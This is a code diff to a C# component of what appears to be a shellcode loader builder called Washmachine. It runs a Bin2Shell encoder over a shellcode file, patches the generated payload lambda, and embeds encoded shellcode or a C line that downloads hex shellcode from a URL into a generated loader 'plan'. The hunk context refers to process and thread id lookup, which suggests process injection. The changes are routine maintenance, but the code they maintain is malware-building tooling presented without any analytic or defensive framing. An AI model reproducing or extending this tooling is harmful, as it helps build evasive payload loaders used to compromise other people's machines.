@@ -1,13 +1,7 @@
-using System;
-using System.Collections.Generic;
 using System.Globalization;
-using System.IO;
-using System.Linq;
 using System.Security.Cryptography;
 using System.Text;
 using System.Text.RegularExpressions;
-using System.Threading;
-using System.Threading.Tasks;
 using Washmachine.Logging;
 using Washmachine.Models;
 
@@ -304,7 +298,7 @@ DWORD GetProcessOrThreadId(const std::wstring& processName, bool returnProcessId
             throw new FileNotFoundException("Shellcode file not found.", filePath);
 
         var args = BuildBin2ShellArguments(data, filePath);
-        _logger.Info($"Bin2Shell command: python main.py {string.Join(" ", args.Select(QuoteArg))}");
+        _logger.Info($"Bin2Shell args: {string.Join(" ", args.Select(QuoteArg))}");
 
         string encoded = await _bin2ShellRunner
             .RunAsync(args, cancellationToken: cancellationToken)
@@ -312,6 +306,13 @@ DWORD GetProcessOrThreadId(const std::wstring& processName, bool returnProcessId
 
         if (string.IsNullOrWhiteSpace(encoded))
             throw new InvalidOperationException("Bin2Shell returned empty output.");
+
+        bool patched = false;
+        encoded = PatchBin2ShellPayloadLambda(encoded, out patched);
+        if (patched)
+        {
+            _logger.Info("Applied Bin2Shell lambda capture workaround for local-scope templates.");
+        }
 
         plan.EncodedShellcodeSnippet = encoded.Trim();
         notes.Add("Encoded shellcode prepared.");
@@ -350,6 +351,25 @@ DWORD GetProcessOrThreadId(const std::wstring& processName, bool returnProcessId
         plan.UrlShellcodeSnippet = $"PCHAR code_blob = UrlDownloadHexTextA((PCHAR)\"{escaped}\", &dwSize);";
         notes.Add("Shellcode URL embedded into plan.");
         _logger.Ok("Shellcode URL embedded.");
+    }
+
+    private static string PatchBin2ShellPayloadLambda(string output, out bool patched)
+    {
+        if (string.IsNullOrWhiteSpace(output))
+        {
+            patched = false;
+            return output ?? string.Empty;
+        }
+
+        bool changed = false;
+        string updated = Bin2ShellPayloadLambdaRegex.Replace(output, match =>
+        {
+            changed = true;
+            return match.Groups[1].Value + "[&](";
+        });
+
+        patched = changed;
+        return updated;
     }
 
     private async Task<string> PersistSourceAsync(string sourceCode, CancellationToken cancellationToken)
@@ -909,6 +929,7 @@ DWORD GetProcessOrThreadId(const std::wstring& processName, bool returnProcessId
 
     private static readonly Regex PlaceholderLineRegex = new(@"^(?<indent>\s*)\{\{(?<name>[A-Z0-9_]+)\}\}\s*$", RegexOptions.Compiled);
     private static readonly Regex InlinePlaceholderRegex = new(@"\{\{(?<name>[A-Z0-9_]+)\}\}", RegexOptions.Compiled);
+    private static readonly Regex Bin2ShellPayloadLambdaRegex = new(@"(bin2shell_payload\s*=\s*)\[\s*\]\s*\(", RegexOptions.Compiled);
 
     private static string ApplyTemplateContent(string content, IReadOnlyDictionary<string, string> values)
     {
@@ -1049,7 +1070,13 @@ DWORD GetProcessOrThreadId(const std::wstring& processName, bool returnProcessId
 
     private IReadOnlyList<string> BuildBin2ShellArguments(UiData data, string shellcodeFile)
     {
-        var args = new List<string> { "-y", _paths.Bin2ShellAlgos };
+        var args = new List<string>();
+
+        if (!string.IsNullOrWhiteSpace(_paths.Bin2ShellAlgos) && File.Exists(_paths.Bin2ShellAlgos))
+        {
+            args.Add("-y");
+            args.Add(_paths.Bin2ShellAlgos);
+        }
 
         if (TryGetEncoderIndex(data, out int encoderIndex))
         {
